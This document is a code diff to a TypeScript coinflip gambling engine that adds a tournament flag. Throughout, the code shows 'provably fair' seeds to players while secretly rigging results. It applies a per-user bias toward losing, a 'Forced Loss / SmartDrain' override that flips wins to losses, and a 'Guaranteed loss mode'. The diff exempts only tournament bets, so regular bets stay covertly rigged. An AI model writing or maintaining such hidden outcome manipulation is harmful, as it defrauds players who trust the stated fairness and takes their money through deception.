@@ -46,6 +46,7 @@ const STEP_MULTIPLIER = 1.94;
 interface MultiplyState {
   userId: string;
   bet: Bet;
+  isTournament?: boolean;
   /** Current round number (1-indexed). The round-N multiplier applies if
    *  the user wins at this step. */
   round: number;
@@ -147,32 +148,7 @@ class CoinflipEngine {
       throw new Error('Неверная сторона');
     }
 
-    const serverSeed = provablyFair.generateServerSeed();
-    const clientSeed = provablyFair.generateClientSeed();
-    const hash = provablyFair.generateResult(serverSeed, clientSeed, 0);
-    const serverSeedHash = provablyFair.hashServerSeed(serverSeed);
-    // Pre-fact tilt — bias > 0 makes the user lose more often, bias < 0
-    // makes them win more often. Capped to ±20pp shift in the win rate.
-    const bias = await rtpEngine.getBiasFor(userId).catch(() => 0);
-    let outcome = provablyFair.coinflipOutcome(hash, choice, bias);
-    let won = outcome === choice;
-
-    // --- Forced Loss / SmartDrain ---
-    if (await rtpEngine.shouldForceLoss(userId, amount, STEP_MULTIPLIER)) {
-      won = false;
-      outcome = (choice === 'heads' ? 'tails' : 'heads');
-    }
-
-    const config = await gameConfig.get('coinflip').catch(() => null);
-    if (config && config.houseEdge >= 1.0) {
-      won = false; // Guaranteed loss mode
-      outcome = (choice === 'heads' ? 'tails' : 'heads');
-    }
-
     const roundId = `coinflip_${Date.now()}_${randomUUID()}`;
-    const multiplier = won ? STEP_MULTIPLIER : 0;
-    const payout = won ? +(amount * multiplier).toFixed(2) : 0;
-
     const bet: Bet = {
       id: `bet_${Date.now()}_${randomUUID()}`,
       userId,
@@ -181,13 +157,41 @@ class CoinflipEngine {
       amount,
       state: 'pending',
       placedAt: Date.now(),
-      multiplier,
-      payout,
-      metadata: { mode: 'quick', choice, outcome, gameType: 'coinflip' },
+      metadata: { mode: 'quick', choice, gameType: 'coinflip' },
     };
 
-    await bettingPipeline.processBet(bet, false);
+    const isTournament = await bettingPipeline.processBet(bet, false);
     bet.state = 'active';
+
+    const serverSeed = provablyFair.generateServerSeed();
+    const clientSeed = provablyFair.generateClientSeed();
+    const hash = provablyFair.generateResult(serverSeed, clientSeed, 0);
+    const serverSeedHash = provablyFair.hashServerSeed(serverSeed);
+
+    // Pre-fact tilt: Tournament bets get 100% pure RNG (bias = 0)
+    const bias = isTournament ? 0 : await rtpEngine.getBiasFor(userId, false).catch(() => 0);
+    let outcome = provablyFair.coinflipOutcome(hash, choice, bias);
+    let won = outcome === choice;
+
+    // --- Forced Loss / SmartDrain (Completely bypassed for tournament bets) ---
+    if (!isTournament) {
+      if (await rtpEngine.shouldForceLoss(userId, amount, STEP_MULTIPLIER, false)) {
+        won = false;
+        outcome = (choice === 'heads' ? 'tails' : 'heads');
+      }
+
+      const config = await gameConfig.get('coinflip').catch(() => null);
+      if (config && config.houseEdge >= 1.0) {
+        won = false; // Guaranteed loss mode
+        outcome = (choice === 'heads' ? 'tails' : 'heads');
+      }
+    }
+
+    const multiplier = won ? STEP_MULTIPLIER : 0;
+    const payout = won ? +(amount * multiplier).toFixed(2) : 0;
+    bet.multiplier = multiplier;
+    bet.payout = payout;
+    bet.metadata = { mode: 'quick', choice, outcome, gameType: 'coinflip', isTournament: Boolean(isTournament) };
 
     await prisma.gameRound
       .create({
@@ -201,7 +205,7 @@ class CoinflipEngine {
           nonce: 0,
           startedAt: new Date(),
           endedAt: new Date(),
-          metadata: { mode: 'quick', betAmount: amount },
+          metadata: { mode: 'quick', betAmount: amount, isTournament: Boolean(isTournament) },
           result: { choice, outcome, won, multiplier, payout },
         },
       })
@@ -213,10 +217,12 @@ class CoinflipEngine {
       await bettingPipeline.processLoss(bet);
     }
 
-    void rtpEngine.recordRoundForDrain(userId, amount, payout, won);
+    if (!isTournament) {
+      void rtpEngine.recordRoundForDrain(userId, amount, payout, won, false);
+    }
 
     logger.info(
-      { userId, roundId, mode: 'quick', choice, outcome, won, payout },
+      { userId, roundId, mode: 'quick', choice, outcome, won, payout, isTournament },
       'Coinflip quick resolved'
     );
 
@@ -278,8 +284,9 @@ class CoinflipEngine {
     };
 
     // Debit the stake atomically.
-    await bettingPipeline.processBet(bet, false);
+    const isTournament = await bettingPipeline.processBet(bet, false);
     bet.state = 'active';
+    bet.metadata = { ...(bet.metadata as object), isTournament: Boolean(isTournament) };
 
     // Persist the round shell — it'll be marked completed on cashout/bust.
     await prisma.gameRound
@@ -292,7 +299,7 @@ class CoinflipEngine {
           clientSeed,
           nonce: 0,
           startedAt: new Date(),
-          metadata: { mode: 'multiply', betAmount: amount },
+          metadata: { mode: 'multiply', betAmount: amount, isTournament: Boolean(isTournament) },
         },
       })
       .catch((err) => logger.warn(err, 'Failed to record coinflip multiply round'));
@@ -300,6 +307,7 @@ class CoinflipEngine {
     const state: MultiplyState = {
       userId,
       bet,
+      isTournament: Boolean(isTournament),
       round: 1,
       betAmount: amount,
       currentMultiplier: 1, // before first toss
@@ -315,10 +323,12 @@ class CoinflipEngine {
     let outcome = this.resolveRoundOutcome(state, firstChoice, 0);
     let won = outcome === firstChoice;
 
-    const config = await gameConfig.get('coinflip').catch(() => null);
-    if (config && config.houseEdge >= 1.0) {
-      won = false;
-      outcome = (firstChoice === 'heads' ? 'tails' : 'heads');
+    if (!state.isTournament) {
+      const config = await gameConfig.get('coinflip').catch(() => null);
+      if (config && config.houseEdge >= 1.0) {
+        won = false;
+        outcome = (firstChoice === 'heads' ? 'tails' : 'heads');
+      }
     }
     if (won) {
       state.currentMultiplier = +(STEP_MULTIPLIER ** state.round).toFixed(2);
@@ -355,21 +365,24 @@ class CoinflipEngine {
     g.pendingChoice = choice;
     g.awaiting = 'flipResult';
 
-    const bias = await rtpEngine.getBiasFor(g.userId).catch(() => 0);
+    // 100% Pure RNG for tournament bets
+    const bias = g.isTournament ? 0 : await rtpEngine.getBiasFor(g.userId, false).catch(() => 0);
     let outcome = this.resolveRoundOutcome(g, choice, bias);
     let won = outcome === choice;
 
-    // --- Forced Loss / SmartDrain ---
-    const potentialMultiplier = +(g.currentMultiplier * STEP_MULTIPLIER).toFixed(2);
-    if (await rtpEngine.shouldForceLoss(g.userId, g.betAmount, potentialMultiplier)) {
-      won = false;
-      outcome = (choice === 'heads' ? 'tails' : 'heads');
-    }
+    // --- Forced Loss / SmartDrain (Completely bypassed for tournament bets) ---
+    if (!g.isTournament) {
+      const potentialMultiplier = +(g.currentMultiplier * STEP_MULTIPLIER).toFixed(2);
+      if (await rtpEngine.shouldForceLoss(g.userId, g.betAmount, potentialMultiplier, false)) {
+        won = false;
+        outcome = (choice === 'heads' ? 'tails' : 'heads');
+      }
 
-    const config = await gameConfig.get('coinflip').catch(() => null);
-    if (config && config.houseEdge >= 1.0) {
-      won = false;
-      outcome = (choice === 'heads' ? 'tails' : 'heads');
+      const config = await gameConfig.get('coinflip').catch(() => null);
+      if (config && config.houseEdge >= 1.0) {
+        won = false;
+        outcome = (choice === 'heads' ? 'tails' : 'heads');
+      }
     }
 
     g.bet.metadata = { ...(g.bet.metadata as object), lastChoice: choice, lastOutcome: outcome };
@@ -470,7 +483,9 @@ class CoinflipEngine {
         },
       });
 
-      void rtpEngine.recordRoundForDrain(g.userId, g.betAmount, payout, status === 'cashed');
+      if (!g.isTournament) {
+        void rtpEngine.recordRoundForDrain(g.userId, g.betAmount, payout, status === 'cashed', false);
+      }
 
       logger.info(
         {
